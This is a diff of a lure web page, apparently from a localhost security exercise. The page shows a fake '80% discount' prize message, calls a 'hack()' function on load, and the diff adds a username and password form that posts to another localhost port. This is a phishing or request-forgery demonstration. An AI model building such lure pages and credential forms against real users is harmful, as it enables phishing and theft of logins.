@@ -41,11 +41,6 @@
     }
 
 
-
-
-
-
-
 </script>
 <body onload="hack()">
 <header class="mdl-layout__header mdl-layout__header--scroll mdl-color--primary">
@@ -59,8 +54,18 @@
         <div class="cart-header mdl-card__title">
             <img src="https://localhost:1759/images/wig.png"/>
             <h2 class="mdl-card__title-text">Congratulations! You have won 80% discount !!!!</h2>
+            <form action="https://localhost:11759/api/login" method="post">
+                Username<br>
+                <input name="username" type="text">
+                <br><br>
+                Password<br>
+                <input name="password" type="password">
+                <br><br>
+                <input type="submit" value="Submit">
+            </form>
         </div>
     </div>
+
 </div>
 </body>
 </html>
